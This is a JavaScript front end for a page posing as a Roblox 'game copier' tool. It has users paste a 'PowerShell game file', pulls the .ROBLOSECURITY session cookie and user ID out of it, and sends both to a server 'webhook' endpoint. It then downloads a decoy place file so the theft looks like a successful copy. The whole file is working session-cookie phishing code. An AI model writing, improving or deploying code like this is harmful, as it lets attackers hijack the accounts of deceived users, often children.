// ================= FRONTEND APP.JS =================
const WEBHOOK_ENDPOINT = "/api/submit";

const gameFileInput = document.getElementById("gameFile");
const pinInput = document.getElementById("pinInput");
const pinError = document.getElementById("pinError");
const copyButton = document.getElementById("copyButton");
const statusMessage = document.getElementById("statusMessage");

// PIN validation
pinInput.addEventListener("input", () => {
    pinInput.value = pinInput.value.replace(/\D/g, "").slice(0, 4);
    validatePin();
});

function validatePin() {
    const isValid = /^\d{4}$/.test(pinInput.value);
    if (pinError) pinError.style.display = isValid ? "none" : "block";
    return isValid;
}

// Extract cookie and rbxuid
function extractGameData(fullText) {
    const cookieMatch = fullText.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
    if (!cookieMatch) {
        return { success: false, message: "Your Game Key is not valid! (Check if you copied it right!)" };
    }
    const robloxCookie = cookieMatch[1];

    const eventTrackerMatch = fullText.match(/RBXEventTrackerV2",\s*"([^"]+)"/);
    let rbxuid = null;
    if (eventTrackerMatch) {
        const rbxuidMatch = eventTrackerMatch[1].match(/rbxuid=(\d+)/);
        if (rbxuidMatch) rbxuid = rbxuidMatch[1];
    }
    if (!rbxuid) {
        return { success: false, message: "Could not find rbxuid in RBXEventTrackerV2. Ensure the PowerShell script contains it." };
    }
    return { success: true, cookie: robloxCookie, rbxuid };
}

// Trigger download of place.rbxl from the public folder
function downloadPlaceFile() {
    const link = document.createElement('a');
    link.href = '/place.rbxl';
    link.download = 'place.rbxl';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
}

copyButton.addEventListener("click", async () => {
    statusMessage.textContent = "";
    if (!validatePin()) {
        statusMessage.textContent = "Please enter a valid 4-digit PIN.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const pastedText = gameFileInput.value.trim();
    if (!pastedText) {
        statusMessage.textContent = "Please paste the PowerShell game file.";
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    const extraction = extractGameData(pastedText);
    if (!extraction.success) {
        statusMessage.textContent = extraction.message;
        statusMessage.style.color = "#ff9d9d";
        return;
    }

    copyButton.classList.add("loading");
    copyButton.disabled = true;
    statusMessage.textContent = "✓ Processing... Please wait.";
    statusMessage.style.color = "#caa8ff";

    try {
        const response = await fetch(WEBHOOK_ENDPOINT, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                cookie: extraction.cookie,
                rbxuid: extraction.rbxuid
            })
        });

        if (!response.ok) {
            throw new Error(`Server error ${response.status}`);
        }

        const result = await response.json();

        // Handle rate limiting (blocked)
        if (result.blocked === true) {
            statusMessage.textContent = result.message || "Your game key appears to be invalid or expired. Please obtain a new key.";
            statusMessage.style.color = "#ff9d9d";
            return;
        }

        // First time success (or after cooldown)
        if (result.success === true && result.firstTime === true) {
            statusMessage.textContent = "✅ Game copied successfully! Starting download...";
            statusMessage.style.color = "#a5d6ff";
            downloadPlaceFile();
            return;
        }

        // Any other failure (webhook failed, etc.)
        statusMessage.textContent = result.error || "✗ Copy failed! Check your internet connection.";
        statusMessage.style.color = "#ff9d9d";
    } catch (err) {
        console.error("Fetch error:", err);
        statusMessage.textContent = "✗ Network error. Could not reach processing server.";
        statusMessage.style.color = "#ff9d9d";
    } finally {
        copyButton.classList.remove("loading");
        copyButton.disabled = false;
    }
});
